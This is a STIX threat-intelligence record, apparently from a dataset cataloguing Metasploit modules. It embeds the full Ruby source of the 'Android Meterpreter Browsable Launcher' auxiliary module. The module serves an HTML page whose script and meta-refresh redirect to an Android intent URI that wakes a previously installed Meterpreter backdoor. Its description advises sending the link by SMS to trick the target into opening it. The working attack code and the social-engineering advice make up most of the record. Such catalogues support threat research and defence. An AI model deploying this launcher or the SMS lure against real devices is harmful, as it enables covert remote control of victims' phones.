{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ddb04967-d4ea-4e28-89bb-63701c52f42e",
    "created": "2024-08-14T16:21:58.87295Z",
    "modified": "2024-08-14T16:21:58.872954Z",
    "name": "\"Android Meterpreter Browsable Launcher\"",
    "description": " This module allows you to open an android meterpreter via a browser. An Android meterpreter must be installed as an application beforehand on the target device in order to use this.  For best results, you can consider using the auxiliary/client/sms/send_text to trick your target into opening the malicious link, and wake up Meterpreter.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/android_browsable_msf_launch.rb",
            "external_id": "android_browsable_msf_launch.rb"
        },
        {
            "source_name": "reference",
            "url": "http://developer.android.com/reference/android/content/Intent.html#CATEGORY_BROWSABLE"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Android Meterpreter Browsable Launcher\",\n      'Description'    => %q{\n        This module allows you to open an android meterpreter via a browser. An Android\n        meterpreter must be installed as an application beforehand on the target device\n        in order to use this.\n\n        For best results, you can consider using the auxiliary/client/sms/send_text to\n        trick your target into opening the malicious link, and wake up Meterpreter.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'sinn3r' ],\n      'References'     =>\n        [\n          [ 'URL', 'http://developer.android.com/reference/android/content/Intent.html#CATEGORY_BROWSABLE' ]\n        ]\n    ))\n  end\n\n  def run\n    exploit\n  end\n\n  def html\n%Q|\n<html>\n<body>\n<script>\nlocation.href = \"intent://my_host#Intent;scheme=metasploit;action=android.intent.action.VIEW;end\";\n</script>\n<noscript>\n<meta http-equiv=\"refresh\" content=\"1; url=intent://my_host#Intent;scheme=metasploit;action=android.intent.action.VIEW;end\">\n</noscript>\n</body>\n</html>\n|\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending HTML...\")\n    send_response(cli, html)\n  end\nend\n"
}